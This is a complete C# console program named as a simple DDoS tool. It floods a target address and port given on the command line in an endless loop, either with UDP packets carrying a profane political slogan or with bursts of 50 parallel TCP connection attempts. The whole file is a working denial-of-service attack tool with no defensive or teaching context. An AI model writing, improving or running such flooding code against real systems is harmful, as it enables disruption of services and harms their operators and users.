using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SimpleDDoSerhii
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                var rand = new Random().Next(1, 14);
                Console.ForegroundColor = (ConsoleColor)rand;
                if (args.Length == 0)
                {
                    Console.WriteLine("Empty arguments");
                    return;
                }
                
                var endPointAddress = args[0];
                var destinationPort = args.Length > 1 ? int.Parse(args[1]) : 53;
                var protocol = args.Length > 2 ? args[2] : "UDP";

                while (true)
                {
                    Up(endPointAddress, destinationPort, protocol);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private static void Up(string address, int port, string protocol)
        {
            
            var data = Encoding.UTF8.GetBytes("russkiy voenniy korabl - idi na xuy");
            if (protocol.ToUpper().Equals("UDP"))
            {
                var client = new UdpClient();
                client.SendAsync(data, data.Length, address, port);
                Console.WriteLine($"{DateTime.Now.ToLongTimeString()}: Sent to endpoint {address}:{port} By protocol: {protocol}");
            }
            else
            {
                Parallel.For(0, 50, i =>
                {
                    try
                    {
                        var client = new TcpClient();
                        client.ConnectAsync(address, port).Wait(10);
                        client.Close();
                        Console.WriteLine($"{DateTime.Now.ToLongTimeString()}: Sent to endpoint {address}:{port} By protocol: {protocol}");
                    }
                    catch (Exception e)
                    {
                    }
                });
                
                
            }

        }
    }
}